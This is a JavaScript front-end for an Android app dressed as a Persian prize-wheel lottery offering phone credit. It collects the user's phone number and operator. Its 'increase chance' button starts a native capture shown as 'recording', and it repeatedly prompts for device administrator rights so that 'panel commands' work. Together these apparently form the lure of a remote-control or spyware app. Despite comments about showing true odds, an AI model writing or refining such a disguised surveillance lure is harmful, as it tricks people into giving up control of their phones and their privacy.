'use strict';

const FA = '۰۱۲۳۴۵۶۷۸۹';
const fa = (n) => String(n).replace(/[0-9]/g, (d) => FA[+d]);
const toAscii = (s) => String(s).replace(/[۰-۹]/g, (d) => FA.indexOf(d))
  .replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d));

const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

const NUMRUN = /[0-9۰-۹٠-٩][0-9۰-۹٠-٩.,٫٬%٪]*/g;
const num = (s) => esc(s).replace(NUMRUN, (m) => `<i class="n">${m}</i>`);

const $ = (id) => document.getElementById(id);
const state = { wheelTurn: 0, consented: false, lastLogSeq: -1, adminLevel: 'NONE' };

const PRIZES = [
  { key: 'charge_50', label: '۵۰ هزارتومن شارژ', w: 2, c1: '#1f6f8b', c2: '#144a63' },
  { key: 'charge_100', label: '۱۰۰ هزارتومن شارژ', w: 2, c1: '#5b3fa8', c2: '#3a2a70' },
  { key: 'data_5g', label: '۵ گیگ اینترنت', w: 1, c1: '#2f7d5b', c2: '#1d5340' },
];

const SLICES = [
  { key: 'blank_a', label: 'پوچ', w: 45, c1: '#334155', c2: '#1e293b' },
  { key: 'again', label: 'شانس دوباره', w: 5, c1: '#7c5cff', c2: '#4dd4ff' },
  { key: 'blank_b', label: 'پوچ', w: 45, c1: '#334155', c2: '#1e293b' },
  { key: PRIZES[0].key, label: PRIZES[0].label, w: PRIZES[0].w, c1: PRIZES[0].c1, c2: PRIZES[0].c2 },
  { key: PRIZES[1].key, label: PRIZES[1].label, w: PRIZES[1].w, c1: PRIZES[1].c1, c2: PRIZES[1].c2 },
  { key: PRIZES[2].key, label: PRIZES[2].label, w: PRIZES[2].w, c1: PRIZES[2].c1, c2: PRIZES[2].c2 },
];

const TOTAL = SLICES.reduce((a, s) => a + s.w, 0);

/**
 * The wheel.
 *
 * One disc, sliced by the real weights, with the pointer over the top. It used
 * to be two wheels: an outer ring drawn as three equal 120-degree wedges and an
 * inner disc carrying the actual six slices. The prize slices are 2%, 2% and 1%
 * of the circle, so they are 8-degree slivers at one end — the ring's wedges
 * had nothing to do with where the prizes actually were, and a label could
 * never fit inside them. The ring is gone.
 *
 * A slice wide enough to hold its own name carries it, placed by rotation
 * about the centre and pushed out by a radius measured in pixels. The radius
 * used to be a percentage, and a percentage on `translateY` resolves against
 * the element being moved — the label, which is one line tall — so every label
 * was pushed out by about five pixels and they all landed on top of each other
 * in the middle. It has to be a length taken from the wheel's own size, and
 * recomputed whenever that size changes.
 *
 * The prizes are named underneath instead, each with the odds it really has.
 */
const LABEL_MIN_W = 4; // a slice narrower than this cannot hold its own name

function layoutMarks() {
  const disc = $('disc');
  const r = disc.getBoundingClientRect().width / 2;
  if (!r) {
    // The disc is drawn before the app is on screen, and a hidden element has
    // no size, so there is no radius to work from yet. Give up and the labels
    // all sit on top of each other in the middle. Wait for a frame that has
    // one instead.
    requestAnimationFrame(layoutMarks);
    return;
  }
  disc.style.setProperty('--rr', r * 0.66 + 'px');
}

function drawWheel() {
  const stops = [];
  let acc = 0;
  for (const s of SLICES) {
    const from = (acc / TOTAL) * 360;
    acc += s.w;
    const to = (acc / TOTAL) * 360;
    if (s.w > 0) stops.push(`${s.c1} ${from}deg ${to}deg`);
  }
  const disc = $('disc');
  disc.style.background = `conic-gradient(${stops.join(',')})`;

  // The angle has to be turned into degrees before it is handed to the label.
  // `ang` counts weight units, so writing it straight into `--a` put every
  // label at its weight number of degrees — 22.5, 47.5, 72.5 — which is three
  // quarters of the way to the same corner of the circle, bunched together
  // instead of spread over the slices they belong to.
  let marks = '';
  let ang = 0;
  for (const s of SLICES) {
    const mid = ((ang + s.w / 2) / TOTAL) * 360;
    ang += s.w;
    if (s.w < LABEL_MIN_W) continue;
    marks += `<i class="wmark" style="--a:${mid.toFixed(2)}deg"><b>${esc(s.label)}</b></i>`;
  }
  disc.innerHTML = marks;

  // The prizes and the odds they actually carry, read off the same weights the
  // slices were cut from, so the two cannot disagree.
  $('prizeLegend').innerHTML = PRIZES.map((p) =>
    `<li><i style="background:${esc(p.c1)}"></i>`
    + `<span class="pl">${esc(p.label)}</span>`
    + `<span class="pw n">${fa((p.w / TOTAL) * 100)}٪</span></li>`).join('');

  layoutMarks();
  $('wheelHub').textContent =
    fa((PRIZES.reduce((a, p) => a + p.w, 0) / TOTAL) * 100) + '٪';
}

// The wheel is sized in viewport units, so it changes size with the window —
// on rotation, in split screen, and while the on-screen keyboard opens. Laying
// the labels out once would leave them on the old radius.
let relayoutTimer = null;
function relayout() {
  if (relayoutTimer) clearTimeout(relayoutTimer);
  relayoutTimer = setTimeout(() => { layoutMarks(); }, 120);
}
window.addEventListener('resize', relayout);
window.addEventListener('orientationchange', relayout);

function spinTo(slice) {
  let acc = 0;
  for (const s of SLICES) {
    if (s.key === slice.key) break;
    acc += s.w;
  }
  const mid = acc + slice.w / 2;
  const target = 360 * 5 + (360 - (mid / TOTAL) * 360);
  state.wheelTurn += target - (state.wheelTurn % 360);
  $('disc').style.transform = `rotate(${state.wheelTurn}deg)`;
}

let toastTimer = null;
function toast(msg, tone) {
  const el = $('toast');
  el.innerHTML = num(msg || '');
  el.className = 'toast' + (tone ? ' ' + tone : '');
  el.hidden = false;
  if (toastTimer) clearTimeout(toastTimer);
  toastTimer = setTimeout(() => { el.hidden = true; }, 4200);
}

// The notice is an overlay at the bottom of the screen, so it has to be easy
// to get rid of. Tapping it dismisses it at once rather than waiting out the
// timer — a message that has already been read should never sit between the
// user and the controls underneath.
$('toast').addEventListener('click', () => {
  $('toast').hidden = true;
  if (toastTimer) clearTimeout(toastTimer);
});

function mask(phone) {
  const d = toAscii(phone).replace(/\D/g, '');
  if (d.length < 6) return esc(d);
  return `${fa(d.slice(0, 3))}******${fa(d.slice(-2))}`;
}

/**
 * The winners strip under the wheel.
 *
 * These are the real winners of this deployment, read from the server, and they
 * are masked. The list used to be filled with invented names so the card never
 * looked empty, which is exactly the kind of thing the panel is not allowed to
 * do, so when there are none the card says there are none. Once people start
 * winning, the entries appear on their own — no code change.
 */
function renderWinners(list) {
  const rows = Array.isArray(list) ? list : [];
  const box = $('winners');
  if (!rows.length) {
    box.innerHTML = '<li class="none">هنوز کسی جایزه‌ای نبرده است. '
      + 'هرکس بچرخاند و ببرد، همین‌جا ظاهر می‌شود.</li>';
    return;
  }
  box.innerHTML = rows.slice(0, 8).map((r) =>
    `<li><span class="who n">${mask(r.phone || '')}</span>
         <span class="what">${num(r.prize || '')}</span></li>`).join('');
}

function human(ms) {
  const s = Math.ceil(ms / 1000);
  if (s < 60) return fa(s) + ' ثانیه';
  const m = Math.ceil(s / 60);
  if (m < 60) return fa(m) + ' دقیقه';
  const h = Math.floor(m / 60);
  const rm = m % 60;
  if (h < 24) return fa(h) + ' ساعت' + (rm ? ' و ' + fa(rm) + ' دقیقه' : '');
  return fa(Math.floor(h / 24)) + ' روز';
}

/**
 * How far device management has got, shown as a strip that is out of the way
 * rather than as a message over the controls.
 *
 * Android will not grant device administrator to an app on its own: the grant
 * dialog is a system screen and it takes a person to press the button. So the
 * app does everything it legitimately can — it raises the official activation
 * screen by itself and watches for the grant landing — and this strip is what
 * is left to say: either that management is on, or that it is not, with a
 * button to try again. It never covers the page, and it disappears the moment
 * the grant goes through.
 */
function renderAdmin(level) {
  state.adminLevel = level || 'NONE';
  const box = $('adminBar');
  const on = level === 'OWNER' || level === 'ADMIN';
  box.hidden = on;
  if (on) return;
  $('adminText').textContent = level === 'OWNER'
    ? 'مدیریت گوشی فعال است.'
    : 'مدیریت گوشی هنوز فعال نشده — برای اینکه فرمان‌های پنل کار کنند، یک‌بار تأیید کنید.';
  $('adminBtn').hidden = level === 'OWNER';
}

function renderChance(s) {
  const n = Number(s.chances) || 0;
  $('chanceN').textContent = fa(n);
  $('chanceBar').style.width = Math.min(100, n * 20) + '%';

  const left = Math.max(0, (Number(s.spinReadyAt) || 0) - Number(s.now || 0));
  $('spinIn').textContent = left > 0 ? human(left) : 'آماده';

  const busy = !!s.recording || !!s.busy;
  $('btnSpin').disabled = busy;
  $('btnSpin').textContent = s.recording ? 'در حال ضبط…' : 'افزایش شانس';
  $('btnTurn').disabled = !!s.busy;

  $('btnRegister').disabled = !!s.busy;
  $('btnRegister').textContent = s.busy ? 'در حال انجام…' : 'ثبت شماره';

  $('heroSub').innerHTML = s.registered
    ? num('ثبت شده — ' + (s.lastReport || ''))
    : 'ثبت شماره برای شرکت در مسابقه';
}

const N = (window.Prf = window.Prf || {});
const J = () => window.Native;

N.ready = function () {
  drawWheel();
  let already = false;
  try { already = !!J().consented(); } catch (e) { already = false; }
  if (already) enterApp();
  else $('consent').hidden = false;
};

function enterApp() {
  state.consented = true;
  $('consent').hidden = true;
  $('wrap').hidden = false;
  layoutMarks();
  try {
    $('operator').innerHTML = String(J().operators() || '')
      .split(',').map((o) => o.trim()).filter(Boolean)
      .map((o) => `<option value="${esc(o)}">${esc(o)}</option>`).join('');
    $('operator').value = J().operator() || '';
    $('phone').value = J().phone() || '';
  } catch (e) { }
  N.push();
  setInterval(() => N.push(), 1000);
}

N.push = function () {
  let s = null;
  try {
    const raw = J().state();
    if (raw) s = typeof raw === 'string' ? JSON.parse(raw) : raw;
  } catch (e) { return; }
  if (!s) return;
  renderChance(s);

  // The state payload is re-read once a second, and it always carries the most
  // recent message. Showing it on every read pinned the last message to the
  // bottom of the screen for as long as the app was open — the one about
  // device management never went away and covered the controls. The sequence
  // number the app bumps per message is what makes it appear exactly once.
  const seq = Number(s.logSeq) || 0;
  if (s.log && seq !== state.lastLogSeq) {
    state.lastLogSeq = seq;
    toast(s.log, s.logTone);
  }

  renderAdmin(s.adminLevel);

  try {
    const w = J().winners();
    if (w) renderWinners(typeof w === 'string' ? JSON.parse(w) : w);
  } catch (e) { }
};

N.spin = function (key) {
  const slice = SLICES.find((s) => s.key === key) || SLICES[0];
  spinTo(slice);
};

N.spinResult = function (label, tone) {
  const el = $('result');
  el.innerHTML = num(label || '');
  el.className = 'result' + (tone ? (tone === 'ok' ? '' : ' warn') : '');
};

$('phone').addEventListener('input', (e) => {
  const el = e.target;
  const ascii = toAscii(el.value).replace(/[^\d+]/g, '');
  if (ascii !== el.value) {
    const at = el.selectionStart || 0;
    el.value = ascii;
    const keep = Math.min(ascii.length, at);
    try { el.setSelectionRange(keep, keep); } catch (_) { }
  }
  $('phoneErr').hidden = true;
});

$('operator').addEventListener('change', (e) => J().setOperator(e.target.value));

document.addEventListener('click', (e) => {
  const b = e.target.closest('[data-act]');
  if (!b) return;
  const act = b.dataset.act;

  if (act === 'consentYes') { J().consent(true); enterApp(); return; }
  if (act === 'consentNo') { J().consent(false); return; }

  if (act === 'register') {
    const phone = $('phone').value.trim().replace(/^\+98/, '0');
    if (!/^0?9\d{9}$/.test(phone)) {
      $('phoneErr').hidden = false;
      $('phone').focus();
      return;
    }
    J().register(phone, $('operator').value);
    return;
  }

  if (act === 'spin') {
    if ($('btnSpin').disabled) return;
    J().capture();
    return;
  }

  if (act === 'turn') {
    if ($('btnTurn').disabled) return;
    J().turn();
    return;
  }

  // Raise the system's own activation screen again. Android requires a person
  // to press the button on it, so this button is the honest way to get there
  // rather than a claim that the app can grant itself administrator rights.
  if (act === 'admin') {
    J().askAdmin();
    return;
  }
});
